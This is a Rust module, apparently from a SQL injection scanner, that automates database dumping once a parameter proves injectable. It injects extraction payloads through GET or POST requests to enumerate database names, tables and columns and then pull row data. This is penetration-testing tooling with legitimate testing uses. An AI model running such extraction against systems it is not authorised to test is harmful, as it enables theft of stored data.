//! Database extraction when --dump and parameter is vulnerable. Port of legacy/lib/techniques/extractor.py

use std::collections::HashMap;

use crate::cli::{print_status, Status};
use crate::http_client::inject_payload_in_url;
use crate::payloads::extraction_payloads_for_db;

use super::ScanContext;

/// Result of extract_all (same shape as Python).
#[derive(Clone, Debug, Default, serde::Serialize)]
pub struct ExtractionResults {
    pub databases: Vec<String>,
    pub tables: HashMap<String, Vec<String>>,
    pub columns: HashMap<String, Vec<String>>,
    pub data: HashMap<String, Vec<String>>,
}

fn extract_content(
    ctx: &ScanContext,
    parameter: &str,
    payload: &str,
) -> Option<String> {
    let res = if ctx.is_post {
        let mut form = ctx.data.map(|m| (*m).clone()).unwrap_or_default();
        form.insert(parameter.to_string(), payload.to_string());
        ctx.handler.post(ctx.url, &form).ok()?
    } else {
        let url = inject_payload_in_url(ctx.url, parameter, payload);
        ctx.handler.get(&url).ok()?
    };
    let text = res.text().ok()?;
    // Simple heuristic: first non-empty line or first 1000 chars
    let trimmed = text.trim();
    if trimmed.len() > 1000 {
        Some(trimmed[..1000].to_string() + "...")
    } else if !trimmed.is_empty() {
        Some(trimmed.to_string())
    } else {
        None
    }
}

/// Run full extraction: databases → tables (first 2 DBs) → columns (first 3 tables) → data (first 3 cols). Same limits as Python.
pub fn extract_all(
    ctx: &ScanContext,
    parameter: &str,
    db_type: Option<&str>,
) -> ExtractionResults {
    let payloads = extraction_payloads_for_db(db_type.unwrap_or("unknown"));
    let mut results = ExtractionResults::default();

    print_status("Extracting database names...", Status::Info);
    for p in &payloads.databases {
        if let Some(r) = extract_content(ctx, parameter, p) {
            print_status(&format!("Found databases: {}", r), Status::Success);
            results.databases.push(r);
            break;
        }
    }

    for db in results.databases.iter().take(2) {
        print_status(&format!("Extracting tables from database {}...", db), Status::Info);
        let mut tables = Vec::new();
        for p in &payloads.tables {
            let formatted = p.replace("{}", db).replace("{0}", db);
            if let Some(r) = extract_content(ctx, parameter, &formatted) {
                print_status(&format!("Found tables: {}", r), Status::Success);
                tables.push(r);
                break;
            }
        }
        results.tables.insert(db.clone(), tables);
    }

    for (_db, tables) in &results.tables.clone() {
        for table in tables.iter().take(3) {
            print_status(&format!("Extracting columns from table {}...", table), Status::Info);
            let mut columns = Vec::new();
            for p in &payloads.columns {
                let formatted = p.replace("{}", table);
                if let Some(r) = extract_content(ctx, parameter, &formatted) {
                    print_status(&format!("Found columns: {}", r), Status::Success);
                    columns.push(r);
                    break;
                }
            }
            results.columns.insert(table.clone(), columns);
        }
    }

    for (table, cols) in &results.columns.clone() {
        let col_str = if cols.is_empty() {
            continue;
        } else {
            cols[0].clone()
        };
        for p in &payloads.data {
            let formatted = p.replace("{0}", &col_str).replace("{1}", table);
            if let Some(r) = extract_content(ctx, parameter, &formatted) {
                print_status(&format!("Found data: {}", r), Status::Success);
                results.data.insert(table.clone(), vec![r]);
                break;
            }
        }
    }

    results
}
